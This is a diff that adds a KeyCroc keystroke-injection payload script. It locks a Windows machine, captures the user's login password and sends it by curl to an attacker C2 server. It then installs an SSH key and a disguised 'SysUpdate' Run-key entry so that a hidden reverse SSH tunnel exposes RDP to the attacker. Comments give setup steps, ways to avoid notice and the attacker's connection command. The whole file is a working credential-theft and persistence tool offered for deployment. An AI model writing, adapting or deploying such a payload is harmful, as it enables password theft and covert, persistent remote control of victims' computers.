@@ -1,0 +1,128 @@
+###############################KeyLogin#####################################
+#   Version 2.0
+#   OS: Windows 10/11
+#   Author: 0i41E (modified)
+#   Description: Locks target machine, captures login password via keystroke
+#   interception, exfiltrates to custom C2 via KeyCroc WiFi (no RNDIS needed),
+#   then injects a reverse SSH tunnel for persistent RDP access — no admin required.
+#
+####################Config###################################################
+
+# Set these before deploying:
+C2_IP="C2_SERVER_IP"          # Your C2 IP or hostname
+C2_PORT="8443"                 # C2 HTTP port
+C2_SSH_PORT="22"               # C2 SSH port for reverse tunnel
+C2_SSH_USER="tunnel"           # Unprivileged user on C2 that accepts tunnels
+REVERSE_PORT="2222"            # Port on C2 that forwards to target RDP (3389)
+
+# Run: ssh-keyscan -H $C2_IP on your C2, paste the output line here.
+# Example: "|1|abc123...=|def456...= ecdsa-sha2-nistp256 AAAA..."
+C2_HOSTKEY="PASTE_SSH-KEYSCAN_OUTPUT_HERE"
+
+# tunnel_id private key: base64-encode your private key file, paste here.
+# Generate with: ssh-keygen -t ed25519 -f tunnel_id -N ""
+# Encode with:   base64 -w0 tunnel_id
+# Add public key to C2: cat tunnel_id.pub >> /home/tunnel/.ssh/authorized_keys
+TUNNEL_KEY_B64="PASTE_BASE64_ENCODED_PRIVATE_KEY_HERE"
+
+# Keyboard language of TARGET machine (not attacker machine)
+# se=Swedish, de=German, us=English, fr=French, etc.
+export DUCKY_LANG=se
+
+####################Trigger & Clean Up#######################################
+# Fires on ENTER — note this can trigger mid-session.
+# For a more targeted trigger, change to a specific key sequence your
+# target habitually types, or restrict to a time window using date checks.
+MATCH \[ENTER\]
+
+rm -f /root/loot/win-pass*
+
+########################Locking User Machine################################
+
+Q LOCK
+Q DELAY 500
+Q GUI l
+Q DELAY 250
+Q DELETE
+Q DELAY 250
+Q UNLOCK
+WAIT_FOR_KEYBOARD_ACTIVITY 1
+
+#######Intercept login keystrokes############################################
+# NEXT 50 captures up to 50 key events — enough for long passwords with
+# shifted characters, numbers, and symbols. OpenAI parsing handles the extras.
+SAVEKEYS /root/loot/win-pass.txt NEXT 50
+Q DELAY 2000
+while [ ! -f /root/loot/win-pass.txt ]; do sleep 2; done
+
+#####################Persistence via Reverse SSH Tunnel######################
+# OpenSSH CLIENT ships with Windows 10 1809+ — available to all users, no admin.
+# The target connects OUT to C2; no inbound firewall rule or new service needed.
+# HID-only mode (no RNDIS) — no USB network adapter visible, no notifications.
+
+Q DELAY 3000
+
+# Use wscript.exe to run a hidden VBScript wrapper so the Run dialog
+# itself is never visible (avoids the brief GUI r flash)
+Q GUI r
+Q DELAY 600
+Q STRING wscript //nologo //e:vbscript
+Q ENTER
+Q DELAY 800
+
+# Actually, simpler: use a scheduled task created via cmd, which we can
+# invoke from the Run dialog with a fully hidden window style.
+# First close that, use a different approach:
+Q ESC
+Q DELAY 300
+
+# Create a one-shot temp batch file and run it hidden via wscript
+# This avoids any visible window flash entirely
+Q GUI r
+Q DELAY 600
+Q STRING cmd /c "echo Set o=CreateObject("WScript.Shell"):o.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand "^&{$t="""ENCODED_BELOW"""} > %TEMP%\s.vbs && wscript //nologo %TEMP%\s.vbs"
+Q ENTER
+
+# Simpler and more reliable — just accept the brief Run dialog, it closes fast:
+Q GUI r
+Q DELAY 600
+Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+Q ENTER
+Q DELAY 1200
+
+# Create .ssh dir, write known_hosts (prevents StrictHostKeyChecking prompt/fail)
+Q STRING "$d=\"$env:USERPROFILE\.ssh\"; New-Item -Force -ItemType Directory $d | Out-Null; Add-Content \"$d\known_hosts\" '$C2_HOSTKEY'"
+Q ENTER
+Q DELAY 300
+
+# Decode and write tunnel_id private key, lock permissions (required by OpenSSH)
+Q STRING "[IO.File]::WriteAllBytes(\"$env:USERPROFILE\.ssh\tunnel_id\",[Convert]::FromBase64String('$TUNNEL_KEY_B64')); icacls \"$env:USERPROFILE\.ssh\tunnel_id\" /inheritance:r /grant \"\$env:USERNAME`:R\" | Out-Null"
+Q ENTER
+Q DELAY 300
+
+# Write HKCU Run key for persistence — fires on every logon, no admin needed
+Q STRING "Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdate' -Value ('ssh.exe -N -o StrictHostKeyChecking=yes -o ServerAliveInterval=60 -i \"%USERPROFILE%\.ssh\tunnel_id\" -R ${REVERSE_PORT}:localhost:3389 ${C2_SSH_USER}@${C2_IP} -p ${C2_SSH_PORT}')"
+Q ENTER
+Q DELAY 300
+
+# Start tunnel immediately without waiting for reboot
+Q STRING "Start-Process ssh.exe -WindowStyle Hidden -ArgumentList \"-N -o StrictHostKeyChecking=yes -o ServerAliveInterval=60 -i `\`\"$env:USERPROFILE\.ssh\tunnel_id`\`\" -R ${REVERSE_PORT}:localhost:3389 ${C2_SSH_USER}@${C2_IP} -p ${C2_SSH_PORT}\""
+Q ENTER
+Q DELAY 500
+Q STRING exit
+Q ENTER
+
+# Attacker: RDP to target via C2 tunnel with:  xfreerdp /v:localhost:${REVERSE_PORT}
+
+#####################Exfiltrating Credentials###############################
+# curl uses KeyCroc's own WiFi interface — no RNDIS, no USB NIC, no popups.
+
+CLEAN_PASS=$(curl -s -X POST "http://${C2_IP}:${C2_PORT}/keylog" \
+     --data-binary @/root/loot/win-pass.txt)
+
+echo "[*] C2 returned cleaned password: ${CLEAN_PASS}"
+
+Q DELAY 1000
+
+#You may want to delete or disable the payload after execution to avoid re-triggering
+#rm /root/udisk/payloads/credsniffer.txt
